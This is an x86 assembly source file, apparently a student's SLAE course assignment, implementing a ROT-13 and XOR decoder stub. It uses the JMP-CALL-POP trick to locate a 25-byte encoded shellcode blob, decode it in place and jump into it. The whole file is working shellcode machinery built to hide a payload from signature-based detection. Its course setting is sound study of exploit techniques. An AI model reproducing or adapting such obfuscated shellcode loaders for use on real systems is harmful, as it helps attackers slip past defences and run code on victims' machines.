; SLAE - Assignment #7: ROT-13 XOR Decoder 
; Author:  Dipsy 
; Student ID: SLAE-1535

global _start			

section .text
_start:
	jmp short call_shellcode

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25

decode:
	mov eax, [esi] 
	xor al, 0xD1	;XOR 

	cmp al, 0xD 	;can we subtract 13? 
	jl mod 		;if not then perform mod operator 
	
	sub al, 0xD 
	mov byte [esi], al
	jmp continue 

mod:
    xor ebx, ebx               
    mov bl, 0xD                 ; ebx = 13
    sub bl, al         

    xor edx,edx                 
    mov dl, 0xff                ; move 255 to dl to avoid zeros 
    inc edx			; increment edx 
    sub dx, bx                  ; 256 - (13 - shellcode byte value)
    mov byte [esi], dl          ; write decoded value

continue: 
    inc esi
    loop decode
    jmp short EncodedShellcode
	
call_shellcode:

	call decoder

	EncodedShellcode: db  0xef, 0x1c, 0x8c, 0xa4, 0xed, 0xed, 0x51, 0xa4, 0xa4, 0xed, 0xbe, 0xa7, 0xaa, 0x47, 0x21, 0x8c, 0x47, 0x3e, 0xb1, 0x47, 0x3f, 0x6c, 0xc9, 0x0b, 0x5c 

